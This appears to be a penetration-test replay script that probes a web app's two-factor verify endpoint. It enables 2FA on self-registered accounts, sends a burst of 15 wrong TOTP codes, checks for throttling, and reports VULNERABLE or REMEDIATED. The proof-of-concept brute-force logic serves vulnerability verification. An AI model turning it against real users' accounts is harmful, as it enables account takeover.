#!/usr/bin/env python3
"""pt35: POST /rest/2fa/verify has no rate limiting, lockout, or
logging of failed attempts, so the entire point of a second factor,
that knowing the password alone isn't enough, can be defeated by
brute force once an attacker has that password.

Found white-box via routes/2fa.ts: otplib.authenticator.check(...) is
called with nothing around it, the same missing-monitoring shape
pt28 found on the primary login endpoint. A six-digit TOTP code is a
1,000,000-value space with no defense against repeated guessing.

Confirmed live: a real test account had 2FA enabled (secret extracted
from the setup flow, a legitimate step any account owner can do for
their own account), then 15 random wrong codes in a row all answered
identically (401), and the real code still worked immediately after.

Standard library only (urllib, base64, hmac, hashlib, struct).
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import json
import random
import struct
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt35-001.json"
BURST_SIZE = 15


def _totp(secret: str, step: int = 30, digits: int = 6, t: float | None = None) -> str:
    key = base64.b32decode(secret.upper() + "=" * (-len(secret) % 8))
    counter = int((t or time.time()) // step)
    msg = struct.pack(">Q", counter)
    digest = hmac.new(key, msg, hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    code = (struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF) % (10 ** digits)
    return str(code).zfill(digits)


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_with_2fa(target: str, label: str, stamp: str) -> str:
    """Registers a fresh account and enables 2FA on it, the real setup
    flow any account owner can do for their own account. Returns the
    TOTP secret."""
    email = f"pt35-{label}-{stamp}@flatline.test"
    password = "Pt35Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    token = body["authentication"]["token"]

    status, body = _request("GET", f"{target}/rest/2fa/status", token=token)
    if status != 200:
        raise RuntimeError(f"2fa status for {email} failed: HTTP {status}")
    secret = body["secret"]
    setup_token = body["setupToken"]
    init_code = _totp(secret)

    status, _ = _request("POST", f"{target}/rest/2fa/setup", token=token, body={
        "password": password, "setupToken": setup_token, "initialToken": init_code,
    })
    if status != 200:
        raise RuntimeError(f"2fa setup for {email} failed: HTTP {status}")

    return email, password, secret


def _login_to_tmp_token(target: str, email: str, password: str) -> str:
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 401 or body.get("status") != "totp_token_required":
        raise RuntimeError(f"expected totp_token_required, got HTTP {status}: {body}")
    return body["data"]["tmpToken"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    email, password, secret = _register_with_2fa(target, "attacker", stamp)
    tmp_token = _login_to_tmp_token(target, email, password)

    burst_statuses = []
    for _ in range(BURST_SIZE):
        wrong_code = f"{random.randint(0, 999999):06d}"
        status, _ = _request("POST", f"{target}/rest/2fa/verify", body={"tmpToken": tmp_token, "totpToken": wrong_code})
        burst_statuses.append(status)

    unthrottled_count = sum(1 for s in burst_statuses if s == 401)
    blocked_count = sum(1 for s in burst_statuses if s == 429)

    correct_code = _totp(secret)
    correct_status, correct_body = _request("POST", f"{target}/rest/2fa/verify", body={"tmpToken": tmp_token, "totpToken": correct_code})
    correct_code_worked = correct_status == 200 and "authentication" in correct_body

    if unthrottled_count == BURST_SIZE and blocked_count == 0 and correct_code_worked:
        status_result = "VULNERABLE"
        summary = f"All {BURST_SIZE} wrong-TOTP attempts answered identically (401), none blocked, and the real code worked immediately after."
    elif blocked_count > 0 and unthrottled_count < BURST_SIZE:
        status_result = "REMEDIATED"
        summary = f"{blocked_count}/{BURST_SIZE} wrong-TOTP attempts were blocked (HTTP 429); the brute-force pattern was interrupted."
    else:
        status_result = "ERROR"
        summary = f"Inconclusive: statuses={burst_statuses}, correct_code_worked={correct_code_worked}."

    # Legitimate case: a different account, correct code on the first
    # attempt, no prior failures recorded for it.
    legit_email, legit_password, legit_secret = _register_with_2fa(target, "legit", stamp)
    legit_tmp_token = _login_to_tmp_token(target, legit_email, legit_password)
    legit_code = _totp(legit_secret)
    legit_status, legit_body = _request("POST", f"{target}/rest/2fa/verify", body={"tmpToken": legit_tmp_token, "totpToken": legit_code})
    legitimate_first_attempt_2fa_ok = legit_status == 200 and "authentication" in legit_body

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status_result,
        "burst_statuses": burst_statuses,
        "unthrottled_count": unthrottled_count,
        "blocked_count": blocked_count,
        "correct_code_worked": correct_code_worked,
        "summary": summary,
        "legitimate_first_attempt_2fa_ok": legitimate_first_attempt_2fa_ok,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt35-2fa-totp-bruteforce", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
